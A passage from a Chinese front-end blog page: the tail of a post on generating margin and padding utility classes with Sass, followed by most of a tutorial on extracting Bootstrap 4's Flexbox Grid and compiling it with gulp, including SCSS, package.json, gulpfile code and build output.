class="number">50px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-n-xxs</span>&#123;<span class="attribute">margin</span>:-<span class="number">2px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-n-xs</span>&#123;<span class="attribute">margin</span>:-<span class="number">5px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-n-sm</span>&#123;<span class="attribute">margin</span>:-<span class="number">10px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-n</span>&#123;<span class="attribute">margin</span>:-<span class="number">15px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-n-md</span>&#123;<span class="attribute">margin</span>:<span class="number">20px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-n-lg</span>&#123;<span class="attribute">margin</span>:<span class="number">30px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-n-xl</span>&#123;<span class="attribute">margin</span>:-<span class="number">40px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-n-xxl</span>&#123;<span class="attribute">margin</span>:-<span class="number">50px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-v-none</span>&#123;<span class="attribute">margin-top</span>:<span class="number">0</span> <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:<span class="number">0</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-v-auto</span>&#123;<span class="attribute">margin-top</span>:auto <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:auto <span class="meta">!important</span>&#125;<span class="selector-class">.m-v-ii</span>&#123;<span class="attribute">margin-top</span>:initial <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:initial <span class="meta">!important</span>&#125;<span class="selector-class">.m-v-ih</span>&#123;<span class="attribute">margin-top</span>:inherit <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:inherit <span class="meta">!important</span>&#125;<span class="selector-class">.m-v-xxs</span>&#123;<span class="attribute">margin-top</span>:<span class="number">2px</span> <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:<span class="number">2px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-v-xs</span>&#123;<span class="attribute">margin-top</span>:<span class="number">5px</span> <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:<span class="number">5px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-v-sm</span>&#123;<span class="attribute">margin-top</span>:<span class="number">10px</span> <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:<span class="number">10px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-v</span>&#123;<span class="attribute">margin-top</span>:<span class="number">15px</span> <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:<span class="number">15px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-v-md</span>&#123;<span class="attribute">margin-top</span>:<span class="number">20px</span> <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:<span class="number">20px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-v-lg</span>&#123;<span class="attribute">margin-top</span>:<span class="number">30px</span> <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:<span class="number">30px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-v-xl</span>&#123;<span class="attribute">margin-top</span>:<span class="number">40px</span> <span class="meta">!important</span>;<span class="attribute">margin-bottom</span>:<span class="number">40px</span> <span class="meta">!important</span>&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>具体的结果等你自己编译一下看看就好啦。</p>
                  <h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2>
                  <p>当然有的小伙伴一定嫌麻烦，别急，我这都给你准备好了，编译好的结果放送给大家！ <a href="http://res.cuiqingcai.com/css/pm.css" target="_blank" rel="noopener">pm.css</a> <a href="http://res.cuiqingcai.com/css/pm.min.css" target="_blank" rel="noopener">pm.min.css</a> 需要使用的小伙伴们直接在HTML代码中引入就好啦！</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">"stylesheet"</span> <span class="attribute">href</span>=<span class="string">"http://res.cuiqingcai.com/css/pm.css"</span>&gt;</span><br><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">"stylesheet"</span> <span class="attribute">href</span>=<span class="string">"http://res.cuiqingcai.com/css/pm.min.css"</span>&gt;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>本文介绍了使用Sass自定义边距样式的流程，希望对大家有帮助！</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-10-29 22:41:08" itemprop="dateCreated datePublished" datetime="2016-10-29T22:41:08+08:00">2016-10-29</time>
                </span>
                <span id="/3276.html" class="post-meta-item leancloud_visitors" data-flag-title="利用Sass自动生成padding和margin边距样式" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>6.7k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>6 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3253.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> HTML <i class="label-arrow"></i>
                  </a>
                  <a href="/3253.html" class="post-title-link" itemprop="url">BootStrap4提取并编译Flexbox Grid系统</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
                  <p>首先 Flexbox 是什么？它是 Bootstrap4 新出的一个布局格式，对移动端开发非常方便。 说一下我为什么要提取 Flexbox。有需求才有动力，首先是需求，最近在开发一个移动端适配的网站，使用了 materi-ui 框架，基于 React。使用 materi-ui 时，已经内置了许多样式，但是 bootstrap 的一些多余样式会影响一些现有样式，而那些样式对我又没啥用。另外 Flex 对于移动端布局开发非常适合，这次正好也拿来练练手。 移动端开发是趋势，随着移动端的发展，BootStrap 也出了新版本 4，不过现在还是 alpha 版本，还没正式推出。 其中一个比较大的改进便是 Flexbox Grid 系统。 BootStrap 原本最常用的布局栅格化系统在做响应式开发的时候比较方便，但是只针对于移动端开发的时候并没有多大用处了，流行的 Flex 布局应用越来越广泛。 在 Founation 中，看到过有了这种 Flex 布局，它就是适应手机开发的框架。后来 Bootstrap4 也增加了这块。 那么 Flexbox Grid 系统相比之前什么改进呢？请看官方文档实例。 <a href="http://v4-alpha.getbootstrap.com/layout/flexbox-grid/" target="_blank" rel="noopener">Flexbox Grid</a> P.S 别去上什么中文网，全是错误，实例结果有问题。不想吐槽，一开始我还以为是 Flexbox Grid 设计不科学。</p>
                  <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2>
                  <p>首先下载 BootStrap V4。 <a href="https://v4-alpha.getbootstrap.com" target="_blank" rel="noopener">Bootstrap V4</a> 目前最新版还是 alpha 版本，如链接失效，请移步官网。 <a href="http://getbootstrap.com" target="_blank" rel="noopener">BootStrap</a> 然后你需要安装了 node，gulp，自行下载即可。 <a href="http://www.gulpjs.com.cn/" target="_blank" rel="noopener">gulp</a></p>
                  <h2 id="开始抽取"><a href="#开始抽取" class="headerlink" title="开始抽取"></a>开始抽取</h2>
                  <p>下载之后打开 Bootstrap 源代码文件夹，找到 scss 目录，可以看到如下的结构。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161029-0@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161029-0@2x-511x1024.png" alt="QQ20161029-0@2x"></a> mixins 是一些可调用的组件，本身编译不会产生任何结果。utilities 是一些公用的包，比如我们要抽取的 Flex 就在这里面。 外面的这么多是一些公用的基本组件。 通过官方文档可以发现：</p>
                  <blockquote>
                    <p>If you’re familiar with modifying variables in Sass—or any other CSS preprocessor—you’ll be right at home to move into flexbox mode.</p>
                    <ol>
                      <li>Open the <code>_variables.scss</code> file and find the <code>$enable-flex</code> variable.</li>
                      <li>Change it from <code>false</code> to <code>true</code>.</li>
                      <li>Recompile, and done!</li>
                    </ol>
                    <p>Alternatively, if you don’t need the source Sass files, you may swap the default Bootstrap compiled CSS with the compiled flexbox variation. <a href="http://v4-alpha.getbootstrap.com/getting-started/download/" target="_blank" rel="noopener">Head to the download page</a> for more information.</p>
                  </blockquote>
                  <p>如果我们想要添加 Flex 组件，还需要将这个变量更改，即将$enable-flex 改成 true 才可以，默认是 false。 在源代码中我们可以发现已经有了一个 bootstrap-flex.scss 的文件，然而这里面发现直接引入了 bootstrap 的所有代码，这并不是我们想要的，它可能会复写一些基本样式，会影响我们的工程。我们想要的是单独把 Flex 部分抽离出来。 所以我们自己新建一个 bootstrap-flex.scss 的空文件。 首先将变量改为 true</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">enable</span>-flex: <span class="literal">true</span>;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后阅读源码可以发现有两个公用的 scss 文件是必须引入的。 variables 和 breakpoints，我们先将他们引入。</p>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">@import</span> <span class="string">"variables"</span>;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">"breakpoints"</span>;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后观察带有 flex 的代码，只发现了在 utilities 文件夹中有相关内容，跑不了了，那就是它，复制到同一路径，引入一下。</p>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">@import</span> <span class="string">"flex"</span>;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>不过发现这个文件里的样式颇少，内容如下：</p>
                  <figure class="highlight scss">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">// Flex variation</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Custom styles for additional flex alignment options.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@if</span> <span class="variable">$enable-flex</span> &#123;</span><br><span class="line">  <span class="keyword">@each</span> <span class="variable">$breakpoint</span> in map-keys(<span class="variable">$grid-breakpoints</span>) &#123;</span><br><span class="line">    <span class="comment">// Flex column reordering</span></span><br><span class="line">    <span class="keyword">@include</span> media-breakpoint-up(<span class="variable">$breakpoint</span>) &#123;</span><br><span class="line">      <span class="selector-class">.flex-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-first &#123; <span class="attribute">order</span>: -<span class="number">1</span>; &#125;</span><br><span class="line">      <span class="selector-class">.flex-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-last &#123; <span class="attribute">order</span>: <span class="number">1</span>; &#125;</span><br><span class="line">      <span class="selector-class">.flex-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-unordered &#123; <span class="attribute">order</span>: <span class="number">0</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Alignment for every item</span></span><br><span class="line">    <span class="keyword">@include</span> media-breakpoint-up(<span class="variable">$breakpoint</span>) &#123;</span><br><span class="line">      <span class="selector-class">.flex-items-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-<span class="attribute">top</span> &#123; <span class="attribute">align-items</span>: flex-start; &#125;</span><br><span class="line">      <span class="selector-class">.flex-items-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-middle &#123; <span class="attribute">align-items</span>: center; &#125;</span><br><span class="line">      <span class="selector-class">.flex-items-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-<span class="attribute">bottom</span> &#123; <span class="attribute">align-items</span>: flex-end; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Alignment per item</span></span><br><span class="line">    <span class="keyword">@include</span> media-breakpoint-up(<span class="variable">$breakpoint</span>) &#123;</span><br><span class="line">      <span class="selector-class">.flex-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-<span class="attribute">top</span>   &#123; <span class="attribute">align-self</span>: flex-start; &#125;</span><br><span class="line">      <span class="selector-class">.flex-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-middle &#123; <span class="attribute">align-self</span>: center; &#125;</span><br><span class="line">      <span class="selector-class">.flex-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-<span class="attribute">bottom</span> &#123; <span class="attribute">align-self</span>: flex-end; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Horizontal alignment of item</span></span><br><span class="line">    <span class="keyword">@include</span> media-breakpoint-up(<span class="variable">$breakpoint</span>) &#123;</span><br><span class="line">      <span class="selector-class">.flex-items-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-<span class="attribute">left</span> &#123; <span class="attribute">justify-content</span>: flex-start; &#125;</span><br><span class="line">      <span class="selector-class">.flex-items-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-center &#123; <span class="attribute">justify-content</span>: center; &#125;</span><br><span class="line">      <span class="selector-class">.flex-items-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-<span class="attribute">right</span> &#123; <span class="attribute">justify-content</span>: flex-end; &#125;</span><br><span class="line">      <span class="selector-class">.flex-items-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-around &#123; <span class="attribute">justify-content</span>: space-around; &#125;</span><br><span class="line">      <span class="selector-class">.flex-items-</span>#&#123;<span class="variable">$breakpoint</span>&#125;-between &#123; <span class="attribute">justify-content</span>: space-between; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这才多点啊？看官方实例明明用到了 row，col 这些样式好不好。再看看。 于是乎发现这些实际上也是依赖于原始的 grid 样式的。我们必须也要把它引入进来。 找找，发现了三个相关文件，拷贝过来，引入。</p>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">@import</span> <span class="string">"mixins/grid"</span>;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">"mixins/grid-framework"</span>;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">"grid"</span>;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>嗯，这下应该全了。 结构如下所示 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161029-1@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161029-1@2x.png" alt="QQ20161029-1@2x"></a></p>
                  <h2 id="编译代码"><a href="#编译代码" class="headerlink" title="编译代码"></a>编译代码</h2>
                  <p>官方用的是 grunt 自动化工具，然而我用着并不习惯。在这里我们用到 gulp 来编译。 首先 npm init 初始化一个 package.json 引入一些包</p>
                  <figure class="highlight 1c">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">"devDependencies"</span>: &#123;</span><br><span class="line">  <span class="string">"babel-core"</span>: <span class="string">"^6.3.26"</span>,</span><br><span class="line">  <span class="string">"babel-preset-es2015"</span>: <span class="string">"^6.16.0"</span>,</span><br><span class="line">  <span class="string">"babel-register"</span>: <span class="string">"^6.18.0"</span>,</span><br><span class="line">  <span class="string">"del"</span>: <span class="string">"^2.2.2"</span>,</span><br><span class="line">  <span class="string">"gulp"</span>: <span class="string">"^3.9.1"</span>,</span><br><span class="line">  <span class="string">"gulp-autoprefixer"</span>: <span class="string">"^3.1.1"</span>,</span><br><span class="line">  <span class="string">"gulp-babel"</span>: <span class="string">"^6.1.2"</span>,</span><br><span class="line">  <span class="string">"gulp-plumber"</span>: <span class="string">"^1.1.0"</span>,</span><br><span class="line">  <span class="string">"gulp-postcss"</span>: <span class="string">"^6.2.0"</span>,</span><br><span class="line">  <span class="string">"gulp-sass"</span>: <span class="string">"^2.3.2"</span>,</span><br><span class="line">  <span class="string">"gulp-sourcemaps"</span>: <span class="string">"^2.2.0"</span>,</span><br><span class="line">  <span class="string">"postcss-scss"</span>: <span class="string">"^0.3.1"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>整体的结构如下</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"bootstrap-flex"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"BootStrap Flex"</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"gulpfile.babel.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">"Germey"</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">  <span class="attr">"devDependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"babel-core"</span>: <span class="string">"^6.3.26"</span>,</span><br><span class="line">    <span class="attr">"babel-preset-es2015"</span>: <span class="string">"^6.16.0"</span>,</span><br><span class="line">    <span class="attr">"babel-register"</span>: <span class="string">"^6.18.0"</span>,</span><br><span class="line">    <span class="attr">"del"</span>: <span class="string">"^2.2.2"</span>,</span><br><span class="line">    <span class="attr">"gulp"</span>: <span class="string">"^3.9.1"</span>,</span><br><span class="line">    <span class="attr">"gulp-autoprefixer"</span>: <span class="string">"^3.1.1"</span>,</span><br><span class="line">    <span class="attr">"gulp-babel"</span>: <span class="string">"^6.1.2"</span>,</span><br><span class="line">    <span class="attr">"gulp-plumber"</span>: <span class="string">"^1.1.0"</span>,</span><br><span class="line">    <span class="attr">"gulp-postcss"</span>: <span class="string">"^6.2.0"</span>,</span><br><span class="line">    <span class="attr">"gulp-sass"</span>: <span class="string">"^2.3.2"</span>,</span><br><span class="line">    <span class="attr">"gulp-sourcemaps"</span>: <span class="string">"^2.2.0"</span>,</span><br><span class="line">    <span class="attr">"postcss-scss"</span>: <span class="string">"^0.3.1"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>执行</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">npm <span class="keyword">install</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>安装一下 node_modules。 然后生成一个.babelrc 文件，因为我们要用 es2015 的语法，内容。</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"presets"</span>: [</span><br><span class="line">    <span class="string">"es2015"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后写一下 gulpfile.babel.js</p>
                  <figure class="highlight coffeescript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> gulp       <span class="keyword">from</span> <span class="string">'gulp'</span>;</span><br><span class="line"><span class="keyword">import</span> plumber <span class="keyword">from</span> <span class="string">'gulp-plumber'</span>;</span><br><span class="line"><span class="keyword">import</span> sass <span class="keyword">from</span> <span class="string">'gulp-sass'</span>;</span><br><span class="line"><span class="keyword">import</span> sourcemaps <span class="keyword">from</span> <span class="string">'gulp-sourcemaps'</span>;</span><br><span class="line"><span class="keyword">import</span> del <span class="keyword">from</span> <span class="string">'del'</span>;</span><br><span class="line"><span class="keyword">import</span> autoprefixer <span class="keyword">from</span> <span class="string">'gulp-autoprefixer'</span>;</span><br><span class="line">const source = [<span class="string">'sass/**/*.scss'</span>];</span><br><span class="line">const dest = <span class="string">'dist/css/'</span>;</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'sass'</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(source)</span><br><span class="line">    .pipe(plumber())</span><br><span class="line">    .pipe(sourcemaps.init())</span><br><span class="line">    .pipe(sass(&#123;outputStyle: <span class="string">'compressed'</span>&#125;).<span class="literal">on</span>(<span class="string">'error'</span>, sass.logError))</span><br><span class="line">    .pipe(sourcemaps.write())</span><br><span class="line">    .pipe(autoprefixer(&#123;</span><br><span class="line">        browsers: [<span class="string">'last 2 versions'</span>],</span><br><span class="line">        cascade: <span class="literal">true</span>,</span><br><span class="line">        remove: <span class="literal">true</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .pipe(gulp.dest(dest));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'clean'</span>, del.bind(<span class="literal">null</span>, [<span class="string">'dist'</span>]));</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'build'</span>, [<span class="string">'sass'</span>, <span class="string">'watch'</span>])</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'watch'</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    gulp.watch(source, [<span class="string">'sass'</span>]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'clean'</span>], <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    gulp.start(<span class="string">'build'</span>);</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>比较简单，用到的有 sass, sourcemaps, autoprefixer 这几个比较常用的包。 执行</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">gulp</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>观察下结果。</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">38</span>] Requiring <span class="keyword">external</span> module babel-register</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">38</span>] Using gulpfile /<span class="keyword">private</span>/var/www/flex/gulpfile.babel.js</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">38</span>] Starting <span class="string">'clean'</span>...</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">38</span>] Finished <span class="string">'clean'</span> after <span class="number">8.12</span> ms</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">38</span>] Starting <span class="string">'default'</span>...</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">38</span>] Starting <span class="string">'sass'</span>...</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">38</span>] Starting <span class="string">'watch'</span>...</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">38</span>] Finished <span class="string">'watch'</span> after <span class="number">9.63</span> ms</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">38</span>] Finished <span class="string">'default'</span> after <span class="number">25</span> ms</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">39</span>] Finished <span class="string">'sass'</span> after <span class="number">312</span> ms</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">39</span>] Starting <span class="string">'build'</span>...</span><br><span class="line">[<span class="number">18</span>:<span class="number">46</span>:<span class="number">39</span>] Finished <span class="string">'build'</span> after <span class="number">2.41</span> μs</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>恩，没什么问题。可以看到 dist 文件夹下生成了一个文件叫做 bootstrap-flex.css。</p>
                  <h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2>
                  <p>恩接下来我们来测试一下官方实例是否正常。 新建一个 index.html 内容如下</p>
                  <figure class="highlight applescript">
                    <table>
                      <tr>
                        <td class="gutter">
